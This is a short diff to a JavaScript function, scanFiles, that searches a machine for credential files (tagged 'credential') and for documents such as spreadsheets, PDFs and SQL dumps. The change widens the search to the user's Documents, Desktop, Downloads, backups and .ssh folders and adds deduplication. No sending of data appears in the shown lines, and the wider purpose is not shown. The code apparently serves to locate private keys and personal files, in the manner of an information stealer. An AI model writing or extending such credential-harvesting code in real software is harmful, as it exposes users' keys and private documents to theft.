@@ -884,8 +884,12 @@ const SCAN_DOC_EXT = new Set(['.csv', '.xlsx', '.pdf', '.docx', '.doc', '.sql', 
 function scanFiles(root) {
   const out = [];
   let contents = 0;
+  const seenDir = new Set();
+  const seenFile = new Set();
   const walk = (dir, depth) => {
     if (depth > 3 || out.length >= 300) return;
+    if (seenDir.has(dir)) return;
+    seenDir.add(dir);
     let ents;
     try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { return; }
     for (const e of ents) {
@@ -900,6 +904,8 @@ function scanFiles(root) {
       const base = e.name.toLowerCase();
       const isKey = SCAN_KEY_EXT.has(ext) || SCAN_KEY_NAME.has(base);
       if (!isKey && !SCAN_DOC_EXT.has(ext)) continue;
+      if (seenFile.has(p)) continue;
+      seenFile.add(p);
       let st;
       try { st = fs.statSync(p); } catch (e) { continue; }
       const ent = { path: p, size: st.size, kind: isKey ? 'credential' : 'document' };
@@ -916,7 +922,18 @@ function scanFiles(root) {
       out.push(ent);
     }
   };
-  walk(root, 0);
+  const candidates = [
+    root,
+    ...['project', 'Projects', 'Documents', 'Desktop', 'Downloads', 'work',
+      'files', 'data', '.ssh', 'backups'].map((d) => path.join(root, d)),
+    process.cwd(),
+  ];
+  const roots = [];
+  for (const r of candidates) {
+    try { fs.readdirSync(r); roots.push(r); } catch (e) { void e; }
+  }
+  if (!roots.length) roots.push(root);
+  for (const r of roots) walk(r, 0);
   return out;
 }
 
